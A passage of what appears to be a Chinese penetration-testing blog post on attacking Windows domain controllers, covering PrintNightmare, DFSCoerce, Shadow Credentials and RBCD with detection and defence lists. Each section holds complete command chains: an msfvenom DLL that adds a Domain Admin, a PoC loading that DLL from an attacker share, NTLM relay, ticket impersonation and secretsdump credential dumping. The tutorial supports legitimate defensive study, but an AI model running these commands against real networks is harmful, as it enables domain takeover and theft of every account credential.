DCSync</span></span><br><span class="line">impacket-secretsdump corp.local/<span class="string">&#x27;dc01&#x27;</span>:<span class="string">&#x27;TGS_ST_HASH&#x27;</span>@10.0.0.10 -just-dc</span><br></pre></td></tr></table></figure>
+
+<h3 id="检测与防御-1"><a href="#检测与防御-1" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
+<li>安装 2021 年 11 月安全更新</li>
+<li>审计 sAMAccountName 变更事件（LDAP 修改监控）</li>
+<li>监控短期内机器账户创建 + 属性修改的异常行为</li>
+</ul>
+<hr>
+<h2 id="四、Print-Spooler-——-PrintNightmare"><a href="#四、Print-Spooler-——-PrintNightmare" class="headerlink" title="四、Print Spooler —— PrintNightmare"></a>四、Print Spooler —— PrintNightmare</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>Windows 打印后台处理程序（Print Spooler）服务是一个长期存在的攻击面。PrintNightmare（CVE-2021-34527）利用了 <code>RpcAddPrinterDriverEx</code> 远程调用，允许已认证用户在远程系统上安装任意打印机驱动，从而实现 <strong>SYSTEM</strong> 权限执行恶意 DLL。</p>
+<p>核心问题在于：</p>
+<ul>
+<li>即使是非管理员用户也能调用该远程 RPC 函数</li>
+<li><code>Point and Print</code> 机制允许从远程服务器加载驱动而无需交互提示</li>
+<li>驱动安装过程中 LoadLibrary 在 SYSTEM 上下文中执行</li>
+</ul>
+<h3 id="攻击实现-1"><a href="#攻击实现-1" class="headerlink" title="攻击实现"></a>攻击实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 msfvenom 生成恶意 DLL payload</span></span><br><span class="line">msfvenom -p windows/x64/exec CMD=<span class="string">&quot;net group &#x27;Domain Admins&#x27; eviluser$ /add /domain&quot;</span> \</span><br><span class="line">  -f dll -o evil.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Impacket 脚本在目标 DC 上安装恶意驱动</span></span><br><span class="line"><span class="comment"># 利用 RpcAddPrinterDriverEx 远程 RPC 调用实现 SYSTEM 权限代码执行</span></span><br><span class="line">impacket-printnightmare -dll evil.dll <span class="string">&#x27;corp.local/lowuser:Password123!@dc01.corp.local&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或直接使用 CVE-2021-1675 PoC</span></span><br><span class="line">python3 CVE-2021-1675.py corp.local/lowuser:<span class="string">&#x27;Password123!&#x27;</span>@10.0.0.10 \</span><br><span class="line">  <span class="string">&#x27;\\10.0.0.1\share\evil.dll&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>禁用域控制器上的 Print Spooler 服务（若不需要打印功能）</li>
+<li>通过 GPO：计算机配置 &gt; 管理模板 &gt; 打印机 &gt; “允许打印后台处理程序接受客户端连接” → 禁用</li>
+<li>限制 <code>Point and Print</code> 为仅来自受信任服务器的驱动包</li>
+</ul>
+<hr>
+<h2 id="五、DFSCoerce-——-分布式文件系统强制认证"><a href="#五、DFSCoerce-——-分布式文件系统强制认证" class="headerlink" title="五、DFSCoerce —— 分布式文件系统强制认证"></a>五、DFSCoerce —— 分布式文件系统强制认证</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>DFSCoerce 利用 MS-DFSNM（Distributed File System Namespace Management）协议中的 <code>NetrDfsAddStdRoot</code> 和 <code>NetrDfsRemoveStdRoot</code> 方法，诱使域控制器向攻击者控制的 IP 发起 <strong>NTLM 认证</strong>。攻击者将捕获到的 NTLM 认证中继到 LDAP(S) 服务，从而创建&#x2F;修改对域控制器的委派权限（RBCD），或直接中继到域控上的其他高价值服务。</p>
+<p>DFSCoerce 与 PetitPotam、PrinterBug 类似，均为 <strong>强制认证</strong> 类的攻击。优势在于 DFSNM 协议常被安全产品忽略。</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境: DC = dc01.corp.local (10.0.0.10), 攻击机 = 10.0.0.100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 启动 NTLM 中继服务器，将认证中继到 LDAPS 并写入 RBCD 委派</span></span><br><span class="line">impacket-ntlmrelayx -t ldaps://dc01.corp.local \</span><br><span class="line">  --delegate-access --escalate-user EVIL\$</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 触发 DFSCoerce，使 DC 向攻击机发起 NTLM 认证</span></span><br><span class="line">python3 dfscoerce.py -u <span class="string">&#x27;lowuser&#x27;</span> -p <span class="string">&#x27;Password123!&#x27;</span> \</span><br><span class="line">  -d corp.local -dc-ip 10.0.0.10 10.0.0.100 dc01.corp.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 利用写入的 RBCD 权限获取 CIFS 服务的 TGS</span></span><br><span class="line">impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \</span><br><span class="line">  <span class="string">&#x27;corp.local/EVIL$:EvilPass!&#x27;</span> -dc-ip 10.0.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 使用 TGS 执行 DCSync 导出全部凭据</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache</span><br><span class="line">impacket-secretsdump -k -just-dc -no-pass dc01.corp.local</span><br></pre></td></tr></table></figure>
+
+<h3 id="检测建议"><a href="#检测建议" class="headerlink" title="检测建议"></a>检测建议</h3><ul>
+<li>监控 <code>NetrDfsAddStdRoot</code> 和 <code>NetrDfsRemoveStdRoot</code> 的远程调用（事件 ID 5145）</li>
+<li>审计域控制器上的委派权限变更（<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性修改）</li>
+<li>网络层面检测来自 DC 的异常 SMB&#x2F;LDAP 出站连接</li>
+</ul>
+<hr>
+<h2 id="六、Shadow-Credentials-——-影子凭据攻击"><a href="#六、Shadow-Credentials-——-影子凭据攻击" class="headerlink" title="六、Shadow Credentials —— 影子凭据攻击"></a>六、Shadow Credentials —— 影子凭据攻击</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>Shadow Credentials 攻击利用了 Active Directory 中的 <strong>Key Credential</strong>（密钥凭据）机制。<code>msDS-KeyCredentialLink</code> 属性用于存储公钥映射，支持基于密钥的认证（如 Windows Hello for Business）。攻击者若能写入目标对象的 <code>msDS-KeyCredentialLink</code> 属性（需要 GenericWrite、WriteProperty 或类似权限），便可以添加一个私钥绑定的 Key Credential，随后通过 PKINIT（Kerberos 的公钥扩展）使用自己的私钥请求目标用户的 TGT。</p>
+<p>这种攻击高度隐蔽，因为修改的是 Key Credential 属性而非传统密码，常常被安全审计忽略。</p>
+<h3 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: 使用 Certipy 添加 Shadow Credential（需目标对象写入权限）</span></span><br><span class="line">certipy shadow auto -u <span class="string">&#x27;lowuser@corp.local&#x27;</span> -p <span class="string">&#x27;Password123!&#x27;</span> \</span><br><span class="line">  -dc-ip 10.0.0.10 -account <span class="string">&#x27;dc01$&#x27;</span></span><br><span class="line"><span class="comment"># 输出: Key Credential 已写入 msDS-KeyCredentialLink，私钥保存为 dc01.pfx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 通过 PKINIT 使用私钥请求目标 TGT</span></span><br><span class="line">certipy cert -pfx dc01.pfx -dc-ip 10.0.0.10 -<span class="built_in">export</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 Rubeus</span></span><br><span class="line">Rubeus.exe asktgt /user:dc01\$ /certificate:&lt;base64-cert&gt; \</span><br><span class="line">  /password:&lt;pfx-password&gt; /domain:corp.local /dc:dc01.corp.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 使用 TGT 执行 DCSync</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=dc01\$.ccache</span><br><span class="line">impacket-secretsdump -k -no-pass dc01.corp.local</span><br></pre></td></tr></table></figure>
+
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>监控 <code>msDS-KeyCredentialLink</code> 属性的非预期修改</li>
+<li>在 AD 中审计对象 ACL 变更，尤其是针对敏感账户的 GenericWrite 权限分配</li>
+<li>启用 Advanced Threat Analytics 或 Microsoft Defender for Identity</li>
+</ul>
+<hr>
+<h2 id="七、RBCD-——-基于资源的约束委派攻击"><a href="#七、RBCD-——-基于资源的约束委派攻击" class="headerlink" title="七、RBCD —— 基于资源的约束委派攻击"></a>七、RBCD —— 基于资源的约束委派攻击</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>基于资源的约束委派（RBCD, Resource-Based Constrained Delegation）通过 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性控制哪些安全主体允许向目标服务执行委派认证。与传统的约束委派（需要 SeEnableDelegationPrivilege）不同，RBCD 由资源的 <strong>所有者</strong> 自行设定，普通用户只要能修改目标机器的该属性，即可将自己的机器账户添加为中继主体。</p>
+<p>攻击者创建一个受控的机器账户 → 将该机器账户添加到目标 DC 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> → 使用 S4U2Self &#x2F; S4U2Proxy 协议请求以任意用户（如 Administrator）身份访问目标的 ST → 获取 DC 上 CIFS 等服务的管理员级访问。</p>
+<h3 id="完整攻击链"><a href="#完整攻击链" class="headerlink" title="完整攻击链"></a>完整攻击链</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提: MachineAccountQuota + 对 DC 的 GenericWrite/WriteProperty</span></span><br><span class="line"><span class="comment"># (也可通过 NTLM 中继使 DC 将权限赋予攻击者控制的机器账户)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建攻击者控制的机器账户</span></span><br><span class="line">impacket-addcomputer corp.local/lowuser:<span class="string">&#x27;Password123!&#x27;</span> \</span><br><span class="line">  -dc-ip 10.0.0.10 -computer-name ATTACKER -computer-pass <span class="string">&#x27;AtkPass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 将 ATTACKER$ 写入 DC 的 msDS-AllowedToActOnBehalfOfOtherIdentity</span></span><br><span class="line">impacket-rbcd -delegate-from <span class="string">&#x27;ATTACKER$&#x27;</span> -delegate-to <span class="string">&#x27;dc01$&#x27;</span> \</span><br><span class="line">  -dc-ip 10.0.0.10 -action write <span class="string">&#x27;corp.local/lowuser:Password123!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 通过 S4U2Self/S4U2Proxy 获取以 Administrator 身份访问 CIFS 的 TGS</span></span><br><span class="line">impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \</span><br><span class="line">  -dc-ip 10.0.0.10 <span class="string">&#x27;corp.local/ATTACKER$:AtkPass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 使用 TGS 执行 DCSync（可选: 导出 krbtgt 哈希打造黄金票据持久化）</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache</span><br><span class="line">impacket-secretsdump -k -no-pass dc01.corp.local -just-dc</span><br></pre></td></tr></table></figure>
+
+<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>限制 MachineAccountQuota（默认值 10 应降为 0）</li>
+<li>监控 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性修改</li>
+<li>启用 LDAP 签名和通道绑定（Channel Binding），防止 NTLM 中继到 LDAP</li>
+<li>域控制器应启用 “Domain controller: LDAP server signing requirements”</li>
+</ul>
+<hr>
+<h2 id="攻击技术对照总结表"><a href="#攻击技术对照总结表" class="headerlink" title="攻击技术对照总结表"></a>攻击技术对照总结表</h2><table>
+<thead>
+<tr>
+<th>攻击技术</th>
+<th>所需权限</th>
+<th>关键协议 &#x2F; API</th>
+<th>攻击结果</th>
+<th>CVSS &#x2F; CVE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DCSync</td>
+<td>DS-Replication-Get-Changes</td>
+<td>MS-DRSR, DRSUAPI</td>
+<td>导出全部凭据</td>
+<td>非漏洞（特性利用）</td>
+</tr>
+<tr>
+<td>Zerologon</td>
+<td>网络可达</td>
+<td>MS-NRPC (Netlogon)</td>
+<td>DC 机器账户密码置空</td>
+<td>CVE-2020-1472 (10.0)</td>
+</tr>
+<tr>
+<td>sAMAccountName 冒充</td>
+<td>可创建机器账户</td>
+<td>Kerberos, LDAP</td>
+<td>获取 DC 管理员 TGT</td>
+<td>CVE-2021-42278 &#x2F; 42287</td>
+</tr>
+<tr>
+<td>PrintNightmare</td>
+<td>域认证用户</td>
+<td>MS-RPRN (Print Spooler)</td>
+<td>DC 上 SYSTEM 代码执行</td>
+<td>CVE-2021-34527 (8.8)</td>
+</tr>
+<tr>
+<td>DFSCoerce</td>
+<td>域认证用户</td>
+<td>MS-DFSNM</td>
+<td>强制 DC NTLM 认证</td>
+<td>无 CVE（协议正常行为）</td>
+</tr>
+<tr>
+<td>Shadow Credentials</td>
+<td>目标对象写权限</td>
+<td>Kerberos PKINIT</td>
+<td>获取目标 TGT</td>
+<td>非漏洞（特性利用）</td>
+</tr>
+<tr>
+<td>RBCD</td>
+<td>目标机器 msDS-AllowedTo… 写权限</td>
+<td>Kerberos S4U</td>
+<td>模拟管理员访问服务</td>
+<td>非漏洞（特性利用）</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="综合防御建议"><a href="#综合防御建议" class="headerlink" title="综合防御建议"></a>综合防御建议</h2><ol>
+<li><strong>补丁管理</strong>：确保域控制器及时安装微软每月安全更新，特别是 2020 年 8 月和 2021 年 11 月的关键补丁</li>
+<li><strong>权限最小化</strong>：审计并限制拥有域复制权限的账户；将 <code>MachineAccountQuota</code> 设置为 0</li>
+<li><strong>协议加固</strong>：启用 LDAP 签名、LDAPS 强制、SMB 签名，部署 EPA（扩展保护认证）与通道绑定</li>
+<li><strong>凭证保护</strong>：启用 Credential Guard、LSA 保护，将敏感账户加入 Protected Users 组</li>
+<li><strong>监控与告警</strong>：部署 SIEM 规则监控 AD 异常属性修改、DRSUAPI 非域控源请求、短期内机器账户创建与属性变更</li>
+<li><strong>网络隔离</strong>：限制访问 DRSUAPI、Netlogon、Print Spooler 等敏感 RPC 端点的源 IP，域控制器不暴露于非管理网段</li>
+<li><strong>应急响应</strong>：制定域控制器入侵应急响应预案，包含 DC 离线审查、krbtgt 密钥轮换、全域密码重置等流程</li>
+</ol>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅供安全研究人员、渗透测试人员在合法授权范围内学习和研究。<strong>严禁将文中技术用于未授权的系统入侵或任何违法犯罪活动。</strong> 作者不对因滥用文中技术导致的任何法律后果承担责任。任何个人或组织在参考本文内容进行安全测试时，必须确保已获得目标系统所有者的明确书面授权。</p>
+<hr>
+<p><em>参考资料：Microsoft MSRC, MITRE ATT&amp;CK, Impacket Project, BloodHound, SpecterOps Research</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Docker-K8s-security/" rel="prev" title="云原生：Docker与Kubernetes安全">
+                  <i class="fa fa-angle-left"></i> 云原生：Docker与Kubernetes安全
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SSRF-basics-exploitation/" rel="next" title="SSRF基础原理与常见利用">
+                  SSRF基础原理与常见利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
